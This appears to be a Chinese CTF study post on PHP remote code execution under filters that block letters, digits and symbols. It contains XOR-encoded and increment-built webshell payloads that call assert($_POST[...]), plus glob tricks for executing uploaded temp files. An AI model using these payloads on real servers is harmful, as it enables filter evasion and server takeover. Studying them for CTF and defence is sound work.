# 不包含数字or字母or特殊字符的RCE


&gt; 参考题目：[SWPUCTF 2021 新生赛]hardrce
&gt; 
&gt; 参考文章：
&gt; [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
&gt;[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

## 绕过思路
### 法一  利用异或绕过
```
(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;)  //&#39;assert&#39;
&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;)  //&#39;_POST&#39;

(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;)($&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;)[&#39;in&#39;])   //&#39;assert($_POST[&#39;in&#39;])&#39;
```
通过本方法可以绕过对于字母的限制

### 法二  利用取反进行绕过
利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如```&#39;```和```{2}```的结果是```\x8c```，其取反即为字母```s```

### 法三  无法使用位运算时
由于```&#39;a&#39;&#43;&#43; =&gt; &#39;b&#39;```，```&#39;b&#39;&#43;&#43; =&gt; &#39;c&#39;```……
通过该特性，可以得到只要能拿到一个变量，其值为a，**通过自增操作即可获得a-z中所有字符**。
而**Array**既有A又有a，因此可以通过其得到A-Z和a-z。
与此同时，在PHP中，**如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array**。
之后进行对Array的截取，可得a或A。


## 常用shell
```
&lt;?php
$_=[];
$_=@&#34;$_&#34;; // $_=&#39;Array&#39;;
$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
$___=$_; // A
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // E 
$___.=$__;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // R
$___.=$__;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // T
$___.=$__;

$____=&#39;_&#39;;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // P
$____.=$__;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // O
$____.=$__;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // S
$____.=$__;
$__=$_;
$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```

## 无字母、数字、$
1. 知识点：
（1）shell下可以利用```.```来执行任意脚本
例：
当前运行的shell是bash，则```. file```的意思就是用bash执行file文件中的命令。
（2）Linux文件名支持用glob通配符代替

2. 针对（1）
如果目标服务器上有一个我们可控的文件，就可以利用```.```来执行它了。
得到文件方法：可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是```/tmp/phpXXXXXX```，文件名最后6个字符是随机的大小写字母

3. 针对（2）
Linux下的glob通配符：
```*```可以代替0个及以上任意字符
```?```可以代表1个任意字符

```/tmp/phpXXXXXX```就可以表示为```/*/?????????```或```/???/?????????```

而glob支持用[^x]的方法来构造 **“这个位置不是字符x”**
可以用这个姿势干掉/bin/run-parts
```
 /???/???[^-]?????	//排除第四位为’-’的文件
  /???/???[^-][^.][^.][^.][^.]?[^.]?	//排除含’.’的文件
```

glob支持利用```[0-9]```来表示一个范围
找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件
ASCII码表中，大写字母位于```@```与```[```之间
可以利用```[@-[]```来表示大写字母

## 构造POC
php生成临时文件名是随机的，最后一个字符不一定是大写字母，要多尝试几次

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97or%E5%AD%97%E6%AF%8Dor%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84rce/  

